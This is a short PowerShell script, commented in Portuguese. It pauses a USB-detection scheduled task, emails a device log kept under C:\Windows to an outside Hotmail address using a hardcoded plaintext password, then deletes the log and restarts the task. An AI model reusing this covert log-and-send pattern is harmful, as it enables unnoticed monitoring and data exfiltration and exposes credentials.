$taskName = "USBDetectScript"
Stop-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 3


# Declara variaveis 
$global:EmailFrom = "a061423049123@hotmail.com"
$global:EmailTo = "a061423049123@hotmail.com"
$global:Password = "SimplePassword123"
$global:Subject = "Logs de dispositivos USB"
$global:Body = "Log de dispositivos ligados e desligados"
$global:SMTPServer = "smtp.outlook.com"
$global:SMTPClient = New-Object Net.Mail.SmtpClient($global:SMTPServer, 587)
$global:SMTPClient.EnableSsl = $true
$global:SMTPClient.Credentials = New-Object System.Net.NetworkCredential($global:EmailFrom, $global:Password)

# cria o MailMessage object
function createMailMessage {
    # Use global variables
    $global:MailMessage = New-Object Net.Mail.MailMessage
    $global:MailMessage.From = $global:EmailFrom
    $global:MailMessage.To.Add($global:EmailTo)
    $global:MailMessage.Subject = $global:Subject
    $global:MailMessage.Body = $global:Body
}

# cria o attachment
function createAttachment {
    createMailMessage
    # adiciona os attachments ao mail (foto e video)
    $file = "C:\Windows\Martelo\usb-log.txt"
    $Attachment = New-Object Net.Mail.Attachment($file)
    
    $global:MailMessage.Attachments.Add($Attachment)
}

# envia o mail
function sendMail {
    createAttachment
    try {
        $global:SMTPClient.Send($global:MailMessage)
        return $true
    } catch {
        write-host "[+] Error sending Email to $global:EmailTo [+]"
        return false
    }
}

# iniciar o envio do mail

if (sendMail) {
    write-host "`n[+] Email sent to -> $global:EmailTo [+]`n"
}



Start-Sleep -Seconds 3

# Specify the file path
$filePath = "C:\Windows\Martelo\usb-log.txt"

# Check if the file exists before attempting to delete
if (Test-Path $filePath) {
    # Delete the file
    Remove-Item -Path $filePath -Force
    Write-Host "File 'usb-log.txt' deleted successfully."
} else {
    Write-Host "File 'usb-log.txt' not found."
}




Start-ScheduledTask -TaskName $taskName